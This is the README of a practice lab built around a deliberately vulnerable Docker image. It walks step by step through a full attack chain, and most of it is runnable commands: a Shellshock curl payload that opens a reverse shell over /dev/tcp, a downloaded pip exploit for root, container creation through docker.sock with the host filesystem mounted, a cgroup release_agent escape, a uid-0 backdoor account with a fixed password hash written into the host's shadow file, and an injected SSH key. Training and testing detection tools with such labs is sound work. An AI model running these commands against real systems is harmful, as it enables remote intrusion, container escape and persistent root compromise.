
# Pentest Docker Step-By-Step

A specially prepared image for Archdays 2020 conference, that can help you to practice penetration testing skills of an application inside a Docker container. The image contains the vulnerable (CVE-2014-6271) Bash package that allows Remote Code Execution. The vulnerability is more commonly known as Shellshock. The image by [opsxcq](https://github.com/opsxcq/exploit-CVE-2014-6271) is taken as a basis.

Exploitation of vulnerability consists of the following stages:
- Gaining access to the container shell under the www-data user using RCE (Shellshock)
- Privilege escalation to root via FakePip exploit
- Connecting to docker.sock and deploying a new ubuntu container with SSH service for further connection (with mount ```/:/host``` and high privileges)
- Create user hidle on host
- Connect to host with new user
- Deploy Weave Scope

This image can also be tested for piloting Container Security solutions. The bash package can be detected by trivy, and docker escape can be detected by Falco.

[Версия на русском](https://github.com/Swordfish-Security/Pentest-In-Docker/blob/master/README-RU.md)

![Pentest-In-Docker-Demo](https://github.com/Swordfish-Security/Pentest-In-Docker/blob/master/2020-11-17-124306.gif)

## Run

To build a vulnerable container image

     docker build . -t vuln-wheezy
     
or

     docker pull dvyakimov/vuln-wheezy

You need to run the application docker.sock mounted:

     docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it -p 8080:80 vuln-wheezy:latest

You can check the availability at ``` localhost: 8080```

# Exploit

### Exploit Shellshock

We have to launch netcat on our machine to get connection by target machine:

    nc -l 1337

In a new window, we exploit RCE with the replacement of ``` <IP-netcat> ``` to the IP where netcat is running, ``` <IP-target>``` to the one where you have the vulnerable service running:

    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/<IP-netcat>/1337 0>&1'" http://<IP-target>/cgi-bin/vulnerable
    
## Inside the container

    # Gather info about OS:
    cat /etc/os-release
    
    # Gather info about kernel. It could be helpful to find CVE and make docker escape for example:  
    uname -rv
    uname -a
    
    # Gather info about yourself:
    id

    # Gather info about current cgroups:
    cat /proc/1/cgroup

    # Gather env. Could be some pass:
    env

    # Gather info about network:
    ifconfig

    # Gather info about mounts:
    cat /proc/mounts

    # Docker.sock could be accessible (yes):
    cat /proc/mounts | grep docker.sock

    # Can we use docker.sock? (yes):
    ls -l /var/run/docker.sock
    
We see that it is possible to install pip packages by sudo:

    sudo -l
    
## Privilege escalation inside container

Dowload exploit for pip in /tmp:

    cd /tmp && wget https://raw.githubusercontent.com/dvyakimov/FakePip/master/setup.py

Change ```<IP-netcat>```  to IP-address, where we have on more netcat:

    cat setup.py | sed "s/192.168.168.2/<IP-netcat>/" > setup-new.py && mv setup-new.py setup.py

Make one more netcat:

    nc -l 13372

Install exploit with pip:

    sudo pip install . --upgrade --force-reinstall

Gain root inside the container.

## Jump to another container

Now when we have root, we can install whatever we need. For example, capsh to find out capabilities:

    apt-get update && \
    apt-get install libcap2-bin

Get capabilities:

    grep Cap /proc/self/status
    capsh --decode=00000000a80425fb   # default run
    # capsh --decode=00000000a82425fb if we add sys_admin
    # capsh --decode=0000003fffffffff with priviliged key 

Here we would install jq and create a container via curl connection in docker.sock, but unfortunately curl on debian 7 is so old that connecting to a unix socket is not supported. Let's take a connection via netcat. There are not many examples on the Internet for connecting via netcat, so we'll figure it out on our own.
Install package to make netcat work with unix-socket:

    apt-get install netcat netcat-openbsd

Now we can make requests to unix-socket:

    echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock

Download some image. Let it be ubuntu with ssh:

    nc -U /var/run/docker.sock
    POST /v1.39/images/create?fromImage=rastasheep/ubuntu-sshd&tag=14.04 HTTP/1.0

Let's create ubuntu container via docker.sock. We have to mount  ```/ ``` to out host ( ```/host ```):

    request="POST /v1.39/containers/create HTTP/1.0\r\nContent-Type: application/json\r\nContent-Length: 12345\r\n\r\n{\"Image\":\"rastasheep/ubuntu-sshd:14.04\",
    \"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\", \"/dev/log:/dev/log\"]}}" && echo -e $request | nc -U /var/run/docker.sock

We have id as output. Start the container (replace ```<id>``` ):

    request="POST /v1.39/containers/<id>/start HTTP/1.0\r\n\r\n" && echo -e $request | nc -U /var/run/docker.sock
    
Check the new container. Here we could get the ```"IPAddress"```:
    
    echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock

Connect to the new container with root (password ```root```):

    ssh root@172.17.0.2

## Docker escape

Since the container has become privileged, you can get a list of host processes.
See the list of processes on the host due to the sys_admin capabilities (for this task you need to insert commands step-by-step):

    d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` \
    mkdir -p $d/w \
    echo 1 >$d/w/notify_on_release \
    t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` \
    touch /o \
    echo $t/c >$d/release_agent \
    printf '#!/bin/sh\nps >'"$t/o" >/c \
    chmod +x /c \
    sh -c "echo 0 >$d/w/cgroup.procs" \
    sleep 1 \
    cat /o

Wheen we connect to the new container let's create a new user ```hidle``` on the host.
Add to /host/etc/passwd:

    echo 'hidle:x:0:0:Hidle,,,:/home/hidle:/bin/bash' >> /host/etc/passwd

Add to /host/etc/shadow (password ```666106610```):

    echo 'hidle:$6$rU8Vq2aztTvx6FT8$WNeoWmMGe3CGEXYid6c2oUqy1rXuo2nLpyQpywECLM5FlUZo7hp6TBPZyHeDMohPamrDKprK5C5zO3gbEYrc20:18582:0:99999:7:::' >> /host/etc/shadow

Add to /host/etc/group:

    echo 'hidle:x:0:' >> /host/etc/group

Add to /host/etc/gshadow:

    echo 'hidle:!::' >> /host/etc/gshadow

And make home dir:

    mkdir /host/home/hidle
    
Unfortunately, you may not be able to connect to the host if the password auth is disabled on the host. In this case:

    mkdir /host/home/hidle/.ssh

Generate key pair:

    ssh-keygen

We put the public key on the host:

    cat  /root/.ssh/id_rsa.pub >> /host/home/hidle/.ssh/authorized_keys

Now we connect to the host using the created user:

    ssh hidle@172.17.0.1

We have connected to the host as root even when we do not know the root password.

## Run commands on the host

Once on the host, we can say that the game is over, but there is one more thing we can do:

    sudo curl -L git.io/scope -o /usr/local/bin/scope
    sudo chmod a+x /usr/local/bin/scope
    scope launch
    
On the same IP address to which we connected with RCE, a new service appeared on port 4040 - Weave Scope. If you go to the new service through a browser, you can see information about all available containers, RAM / CPU and even run some coommands via terminal in web.

[Here's](https://www.intezer.com/blog/cloud-workload-protection/attackers-abusing-legitimate-cloud-monitoring-tools-to-conduct-cyber-attacks/) a real story with a Weave scope attack.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that Swordfish Security is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Swordfish Security responsibility.
